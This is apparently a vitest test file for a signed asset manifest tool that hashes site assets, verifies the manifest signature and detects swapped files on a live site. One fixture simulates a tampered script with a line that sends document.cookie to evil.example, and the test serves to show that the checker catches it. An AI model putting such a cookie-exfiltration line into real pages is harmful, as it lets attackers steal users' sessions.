import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { bytesToBase64, createIdentity } from "@qsetu/core";
import { describe, expect, it } from "vitest";
import { buildManifest, checkSite, MANIFEST_PATH, sri, verifyManifest } from "../src/manifest";

const id = createIdentity("standard");
const pub = bytesToBase64(id.publicKey);

function site() {
  const dir = mkdtempSync(join(tmpdir(), "mf-"));
  mkdirSync(join(dir, "chunks"));
  writeFileSync(join(dir, "chunks", "app.js"), "console.log('app')");
  writeFileSync(join(dir, "main.css"), "body{}");
  writeFileSync(join(dir, "notes.txt"), "not an asset");
  return dir;
}

describe("Signed asset manifest", () => {
  it("lists every asset with its SRI hash and verifies against the pinned key", () => {
    const m = buildManifest({
      roots: [[site(), "/_next/static"]],
      site: "https://shop.example",
      identity: id,
    });
    expect(Object.keys(m.files).sort()).toEqual([
      "/_next/static/chunks/app.js",
      "/_next/static/main.css",
    ]);
    expect(m.files["/_next/static/main.css"]).toBe(sri(new TextEncoder().encode("body{}")));
    expect(verifyManifest(m, pub)).toEqual({ ok: true });
  });

  it("fails if one hash is changed, a file is added, or a different key is pinned", () => {
    const m = buildManifest({
      roots: [[site(), "/s"]],
      site: "https://shop.example",
      identity: id,
    });
    const edited = {
      ...m,
      files: { ...m.files, "/s/main.css": sri(new TextEncoder().encode("body{color:red}")) },
    };
    expect(verifyManifest(edited, pub)).toEqual({ ok: false, reason: "signature" });
    const added = { ...m, files: { ...m.files, "/s/evil.js": "sha384-x" } };
    expect(verifyManifest(added, pub)).toEqual({ ok: false, reason: "signature" });
    expect(verifyManifest(m, bytesToBase64(createIdentity("standard").publicKey))).toEqual({
      ok: false,
      reason: "key",
    });
  });

  it("checks a live site and names the file that was swapped", async () => {
    const m = buildManifest({
      roots: [[site(), "/s"]],
      site: "https://shop.example",
      identity: id,
    });
    const served: Record<string, string> = {
      [MANIFEST_PATH]: JSON.stringify(m),
      "/s/chunks/app.js": "console.log('app'); fetch('https://evil.example/'+document.cookie)",
      "/s/main.css": "body{}",
    };
    const f = (async (u: string) => {
      const body = served[new URL(u).pathname];
      return body === undefined ? new Response("", { status: 404 }) : new Response(body);
    }) as typeof fetch;
    const r = await checkSite("https://shop.example", pub, 50, f);
    expect(r.signature.ok).toBe(true);
    expect(r.checked).toBe(2);
    expect(r.mismatched).toEqual(["/s/chunks/app.js"]);
  });
});
